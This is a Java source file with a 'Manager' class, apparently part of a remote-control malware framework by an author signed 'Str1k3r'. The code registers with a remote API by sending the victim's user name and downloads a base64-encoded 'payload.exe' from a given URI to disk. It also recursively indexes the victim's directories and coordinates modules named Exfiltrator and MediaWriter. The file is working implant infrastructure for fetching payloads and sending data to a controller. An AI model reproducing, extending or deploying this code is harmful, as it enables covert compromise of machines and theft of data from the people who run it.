package modules.auxiliary;

import java.io.*;
import java.net.InetAddress;
import java.net.http.HttpClient;
import java.net.http.HttpClient.Version;
import java.net.http.HttpClient.Redirect;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;
import java.security.KeyStore;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.time.Duration;
import java.util.Base64;
import java.util.LinkedList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import modules.core.Exfiltrator;
import modules.core.MediaWriter;
import modules.file.CopyFileHandler;
import modules.net.CopyHttpClient;

import javax.net.ssl.*;

/**
    Manages running modules, and completes auxiliary functionality.

    @author Str1k3r
    @version 1.0
*/
public class Manager {

    public static final int DEFAULT_NOTHREADS = 5; // default no. of threads to execute modules over
    public static final String PAYLOAD_DIR = "./data/";
    private static Manager instance;

    private HttpClient client;
    private ExecutorService mainThreadPool;
    private String connectionID;

    private final int MAX_SUBDIRS = 500;


    private Manager() {
        client = createHttpClient();
        mainThreadPool = Executors.newCachedThreadPool();
        connectionID = RequestConnectionId();
    }

    /**
        Create and return a single instance of this class.

        @return Returns the existing Manager instance.
    */
    public static Manager getInstance() {
        if(instance == null) {
            instance = new Manager();
        }

        return instance;
    }

    /**
        Spawn thread of provided task.

        @param task A runnable instance.
    */
    public void executeThread(Runnable task) {
        mainThreadPool.execute(task);
    }

    public void connect() {
        connectionID = RequestConnectionId();
    }

    /**
        Returns current connection Id to the API.

        @return An integer representing the connection Id.
    */
    public String getConnectionId() {
        return connectionID;
    }

    /**
        Create a Http Client with an SSL context for use by the caller.

        @return HttpClient instance.
     */
    public HttpClient createHttpClient() {
        SSLContext sslContext = SSLContextCreator.getSslContext();

        HttpClient.Builder builder = HttpClient.newBuilder();
        if(sslContext != null) {
            builder = builder.sslContext(sslContext);
        }

        builder = builder
                .version(Version.HTTP_1_1)
                .followRedirects(Redirect.NORMAL)
                .connectTimeout(Duration.ofSeconds(20));

        return builder.build();
    }

    /**
        Convert provided JSON string to a Response object.

        @param jsonString JSON string to convert.
        @return Response instance.
     */
    public Response jsonToResponse(String jsonString) {

        GsonBuilder builder = new GsonBuilder();
        builder.registerTypeAdapter(Response.class, new ResponseAdapter());
        Gson gson = builder.create();

        return gson.fromJson(jsonString, Response.class);
    }

    /**
        Convert provided JSON string to a Command object.

        @param jsonString JSON string to convert.
        @return Command instance.
     */
    public Command jsonToCommand(String jsonString) {
        GsonBuilder builder = new GsonBuilder();
        builder.registerTypeAdapter(Command.class, new CommandAdapter());
        Gson gson = builder.create();

        return gson.fromJson(jsonString, Command.class);
    }

    /**
        Convert a provided RequestParameter object to a corresponding JSON string.

        @param parameter RequestParameter object to convert.
        @return A JSON format string.
     */
    public String requestParameterToJSON(RequestParameter parameter) {
        GsonBuilder builder = new GsonBuilder();
        builder.registerTypeAdapter(RequestParameter.class, new RequestParameterAdapter());
        Gson gson = builder.create();

        return gson.toJson(parameter);
    }

    /**
        Convert a provided CmdResult object to a corresponding JSON string.

        @param result CmdResult object to convert.
        @return A JSON format string.
     */
    public String cmdResultToJSON(CmdResult result) {
        GsonBuilder builder = new GsonBuilder();
        builder.registerTypeAdapter(CmdResult.class, new CmdResultAdapter());
        Gson gson = builder.create();

        return gson.toJson(result);
    }

    /**
        Convert a provided FileSubmission object to a corresponding JSON string.

        @param submission FileSubmission object to convert.
        @return A JSON format string.
     */
    public String fileSubmissionToJSON(FileSubmission submission) {
        GsonBuilder builder = new GsonBuilder();
        builder.registerTypeAdapter(FileSubmission.class, new FileSubmissionAdapter());
        Gson gson = builder.create();

        return gson.toJson(submission);
    }

    /**
         Returns a directory list of the provided path/

         @param path The path to return a directory list of.
         @return An array of File objects of the items in the directory
     */
    public final File[] getDirectoryList(File path) {
        File[] directoryList = null;
        try {
            // get the abstract path names; avoid duplication into program directory
            directoryList = path.listFiles();

        }
        catch(SecurityException secEx) {
            return null; // nothing obtained
        }
        return directoryList;
    }

    /**
         Creates a queue of subdirectories to recurse into when behaving recursively

         @param rootDir The directory to start from.
         @return A LinkedList of File objects to subdirectories
     */
    public final LinkedList<File> getDirectoryQueue(File rootDir) {
        LinkedList<File> queue = new LinkedList<>();
        recurseIndex(queue, rootDir);
        return queue;
    }

    /**
         Indexes all subdirectories of a provided root directory into a queue for later processing.

         @param queue The queue to index into.
         @param root The root directory to index from.
     */
    private void recurseIndex(LinkedList<File> queue, File root) {
        try {
            File[] listing = root.listFiles();
            if(listing == null) {
                return;
            }

            for(File item : listing) {
                // bound number of indexed subdirecotories
                if(queue.size() >= MAX_SUBDIRS) {
                    return; // abort
                }

                // we are looking for directories
                if(item.isDirectory()) {
                    queue.addLast(item); // add to queue and
                    recurseIndex(queue, item); // recurse into directory
                }

            }
            // end reached; no more directories in here, go back
        }
        catch(SecurityException secEx) {
            // no need to continue - skip indexing
        }
    }

    /**
         Downloads a payload from a provided URI.

         @param uriString The URI to download the payload from.
         @return Returns the path the payload saved to if the payload was fetched successfully, null otherwise.
     */
    public final String fetchPayload(String uriString) {
        CopyHttpClient client = CopyHttpClient.getInstance();

        String payload_filename = "payload.exe";
        if(!payloadAccessible(payload_filename)) {
            HttpResponse<String> response = client.get(uriString);
            if(response == null) {
                // request was 404 / 500 / etc
                return null;
            }

            Response content = jsonToResponse(response.body()); // fetch response object from HttpResponse

            boolean success = CopyFileHandler.saveBytes(PAYLOAD_DIR, payload_filename,
                    Base64.getDecoder().decode(content.data)); // decode data from base64 and save
            if(!success) {
                return null;
            }
        }

        System.out.println("[*] Payload fetched.");
        return PAYLOAD_DIR.concat(payload_filename);
    }

    /**
         Checks for payload locally.

         @return Returns true if the payload is accessible; that is meets specific conditions,
                 otherwise false.
     */
    private final boolean payloadAccessible(String filename) {
        File payload = new File(String.format("%s%s", PAYLOAD_DIR, filename));

        try {
            // Must exist, be a normal file AND have read permission
            return (payload.exists() && payload.isFile() && payload.canRead());
        }
        catch(SecurityException secEx) {
            return false;
        }
    }

    /**
         Validate directory path. Exists and is directory.

         @param path Directory path to validate.
     */
    public final void checkDir(File path) {
        try {
            if(!path.exists()) {
                Manager.exit(EExecCode.PATH_NOT_EXIST);
            }

            if(!path.isDirectory()) {
                Manager.exit(EExecCode.NOT_DIRECTORY);
            }
        }
        catch(SecurityException secEx) {
            Manager.exit(EExecCode.CANNOT_READ_DIR);
        }
    }

    /**
         Terminates the program with execution status.

         @param execCode The code representing the execution status.
     */
    public static void exit(EExecCode execCode) {
        // output exec msg and terminate
        System.out.println(execCode.message());
        System.exit(execCode.code());
    }

    /**
         Safely terminates thread pool threads.
     */
    public void shutdown() {
        // shutdown sub threads
        Exfiltrator.shutdown();
        MediaWriter.shutdown();

        // shutdown main thread initiator
        mainThreadPool.shutdown();
        try {

            if (!mainThreadPool.awaitTermination(30, TimeUnit.SECONDS)) {
                mainThreadPool.shutdownNow();
            }
        }
        catch (Exception ex) {
            mainThreadPool.shutdownNow(); // waiting was interrupted
        }
    }

    /**
        Fetches connection id for client from the API.

        @return A string of the connection id.
    */
    private String RequestConnectionId() {
        RequestParameter clientName = new RequestParameter()
                .name("")
                .value(System.getProperty("user.name"));

        String body = requestParameterToJSON(clientName);

        HttpRequest request = HttpRequest.newBuilder()
                .uri(Endpoint.connection())
                .version(Version.HTTP_2)
                .headers("Content-type","application/json")
                .POST(BodyPublishers.ofString(body))
                .build();

        int counter = 0;
        while(counter <= 10) { // make multiple attempts on continuous fail
            try {
                HttpResponse<String> httpResponse = client.send(request, BodyHandlers.ofString());

                Response response = jsonToResponse(httpResponse.body());

                System.out.printf("[*] Connection id: %s: %s\n", response.message, response.data);
                return response.data;
            }
            catch(Exception ex) { // IO/Interrupted exceptions

                try {
                    System.out.println("[Error] Failed to get connection id.");
                    ex.printStackTrace();
                    Thread.sleep(Duration.ofSeconds(2)); // wait before next attempt
                }
                catch(InterruptedException interruptEx) { /*pass*/ }
            }

            counter++;
        }

        return null; // Failed to obtain id
    }


}
